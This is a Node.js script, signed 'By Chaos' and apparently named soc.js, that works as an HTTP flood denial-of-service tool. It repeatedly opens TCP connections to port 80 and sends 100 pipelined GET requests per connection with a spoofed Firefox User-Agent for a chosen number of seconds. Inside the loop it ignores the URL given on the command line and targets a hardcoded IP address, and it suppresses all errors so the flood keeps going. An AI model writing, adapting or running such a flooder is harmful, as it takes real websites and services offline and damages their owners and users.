const url = require("url");
const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY); 
if(process.argv.length !== 4){
console.log("By Chaos \n node soc.js url time")
process.exit(0)
}
var target = process.argv[2];
var time = process.argv[3];
var host = url.parse(target).host;
var intv = setInterval(()=>{
const client = require("net").Socket()
var ua = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
var target = "http://95.211.208.171"
var host = "95.211.208.171"
var pakete = 'GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'
client.connect(80,host)
client.setTimeout(10000);
for(let i=0;i<100;i++){
client.write(pakete)
}
client.on('data',()=>{
setTimeout(()=>{
client.destroy();
return delete client;
})
})


console.log(target,host,time)
setTimeout(()=>clearInterval(intv),time*1000)
})



process.on('uncaughtException', function (err) {
	console.log(err);
});

process.on('unhandledRejection', function (err) {
	console.log(err);
});
